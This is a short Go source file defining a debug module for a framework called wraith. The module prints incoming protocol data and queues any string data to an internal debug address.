package mod_part

import (
	"fmt"

	"git.0x1a8510f2.space/0x1a8510f2/wraith/libwraith"
)

type DebugModule struct {
	w *libwraith.Wraith
}

func (m *DebugModule) WraithModuleInit(wraith *libwraith.Wraith) {
	fmt.Printf("DEBUG: mod_part.DebugModule.WraithModuleInit called\n")

	m.w = wraith
}
func (m *DebugModule) ProtoPartModule() {}

func (m *DebugModule) ProcessProtoPart(hkvs *libwraith.HandlerKeyValueStore, data interface{}) {
	fmt.Printf("DEBUG: mod_part.DebugModule.ProcessProtoPart called with params: %v | %v\n", hkvs, data)

	dataString, ok := data.(string)

	if ok {
		m.w.PushTx(libwraith.TxQueueElement{
			Addr: "w.debug://wraith",
			Data: map[string]interface{}{
				"DEBUG_DATA": dataString,
			},
			Encoding: "w.debug",
		})
	}
}
